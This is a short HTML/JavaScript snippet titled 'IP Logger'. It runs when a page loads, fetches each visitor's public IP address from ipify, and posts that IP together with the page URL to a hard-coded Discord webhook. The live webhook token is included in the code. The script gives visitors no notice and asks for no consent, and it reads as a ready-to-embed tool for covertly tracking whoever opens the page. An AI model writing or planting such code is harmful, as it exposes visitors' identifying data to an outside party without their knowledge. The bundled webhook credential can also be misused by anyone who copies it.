<script>
// Get visitor IP and send to Discord Webhook
fetch('https://api.ipify.org?format=json')
  .then(response => {
    if (!response.ok) throw new Error('Failed to get IP');
    return response.json();
  })
  .then(data => {
    const ip = data.ip;
    const webhookURL = 'https://discord.com/api/webhooks/1373867976188756008/YsV-h95KrYtgAjJi2bZst4qzbcaTTZ57JZYESO3uPFVd-sivSXBJSYSJX1xyFhMzqtMg';

    const payload = {
      content: `🌐 New visitor\n**IP**: ||${ip}||\n**Page**: ${window.location.href}`,
      username: "IP Logger"
    };

    return fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });
  })
  .then(response => {
    if (!response.ok) {
      console.error('Failed to send IP to webhook');
    }
  })
  .catch(error => {
    console.error('Error:', error);
  });
</script>
